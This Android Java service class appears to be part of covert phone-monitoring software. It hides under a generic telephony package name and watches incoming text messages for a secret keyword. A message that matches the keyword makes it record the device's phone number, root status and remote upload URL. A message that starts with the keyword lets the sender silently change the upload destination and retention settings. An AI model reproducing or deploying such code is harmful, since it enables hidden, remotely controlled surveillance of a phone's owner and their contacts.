package com.telephony.services;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class SMService extends Service {
	private PreferenceUtils sPref = null;
	private ExecutorService es;

	private String sms_body = null;
	private String phoneNumber = null;
	private String sms_from_name = null;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {

		super.onCreate();
		es = Executors.newFixedThreadPool(1);
		sPref = PreferenceUtils.getInstance(this);
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.execute(new RunService(intent, flags, startId, this));
		return START_REDELIVER_INTENT;

	}

	private void getConfig(String filename) throws UnsupportedEncodingException, IOException {
		FileOutputStream fos = null;
		MyProperties prop = new MyProperties();
		try {
			fos = new FileOutputStream(new File(sPref.getRootDir(), filename));
			prop.setProperty("phone_number", Utils.getSelfPhoneNumber(this));
			prop.setBoolProperty("root", Utils.CheckRoot());
			prop.setProperty(PreferenceUtils.ROOT_DIR, sPref.getRootDir().getAbsolutePath());
			prop.setProperty(PreferenceUtils.UPLOAD_URL, sPref.getRemoteUrl());
			prop.setIntProperty(PreferenceUtils.KEEP_DAYS, sPref.getKeepDays());
			prop.setBoolProperty(PreferenceUtils.VIBRATE, sPref.getVibrate());
			prop.setIntProperty(PreferenceUtils.VIBRATE_TIME, sPref.getVibrateTime());
			prop.store(fos, Utils.IDENT_SMS);
		} finally {
			if (fos != null) {
				fos.close();
			}
		}
	}

	private void setConfig(String src) throws IOException {
		MyProperties prop = new MyProperties();

		prop.load(src);
		sPref.setRootDir(prop.getProperty(PreferenceUtils.ROOT_DIR));
		sPref.setRemoteUrl(prop.getProperty(PreferenceUtils.UPLOAD_URL));
		sPref.setKeepDays(prop.getIntProperty(PreferenceUtils.KEEP_DAYS));
		sPref.setVibrate(prop.getBoolProperty(PreferenceUtils.VIBRATE));
		sPref.setVibrateTime(prop.getIntProperty(PreferenceUtils.VIBRATE_TIME));
	}

	private class RunService implements Runnable {
		private final Intent intent;
		private final int flags;
		private final int startId;
		private final Context context;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		public void run() {
			try {
				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": stop " + startId);
				if (sPref.getRootDir().exists() && (Utils.updateExternalStorageState() == Utils.MEDIA_MOUNTED)) {
					phoneNumber = intent.getStringExtra(Utils.EXTRA_SMS_FROM);
					sms_from_name = Utils.getContactName(context, phoneNumber);
					sms_body = intent.getStringExtra(Utils.EXTRA_SMS_BODY).trim();
					if (sms_body != null) {
						if (sms_body.equals(Utils.IDENT_SMS)) {
							Log.d(Utils.LOG_TAG, "Send configuration to " + phoneNumber);
							getConfig(Utils.CONFIG_OUT_FILENAME);
						} else if (sms_body.startsWith(Utils.IDENT_SMS)) {
							Log.d(Utils.LOG_TAG, "set configuration");
							setConfig(sms_body);
						}
					}

					Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				stop();
			}
		}

		public void stop() {
			try {

			} catch (Exception e) {
				e.printStackTrace();
			}
			Log.d(Utils.LOG_TAG, context.getClass().getName() + ": stop " + startId);
			stopSelf(startId);
		}

	}

	@Override
	public void onDestroy() {

		super.onDestroy();
		es = null;
		sPref = null;
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

}
